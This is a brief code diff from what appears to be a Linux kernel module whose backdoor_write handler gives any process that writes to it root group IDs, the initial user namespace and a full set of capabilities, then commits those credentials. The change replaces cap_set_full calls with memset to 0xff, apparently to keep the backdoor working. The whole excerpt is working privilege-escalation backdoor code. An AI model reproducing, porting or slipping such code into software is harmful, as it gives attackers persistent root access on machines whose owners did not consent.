@@ -38,9 +38,9 @@ static ssize_t backdoor_write(struct file *file, const char __user *buffer,
     new->gid = new->egid = new->sgid = new->fsgid = make_kgid(&init_user_ns, 0);
     new->user_ns = &init_user_ns;
 
-    cap_set_full(&new->cap_effective);
-    cap_set_full(&new->cap_inheritable);
-    cap_set_full(&new->cap_permitted);
+    memset(&new->cap_effective, 0xff, sizeof(new->cap_effective));
+    memset(&new->cap_inheritable, 0xff, sizeof(new->cap_inheritable));
+    memset(&new->cap_permitted, 0xff, sizeof(new->cap_permitted));
 
     commit_creds(new);
     return count;
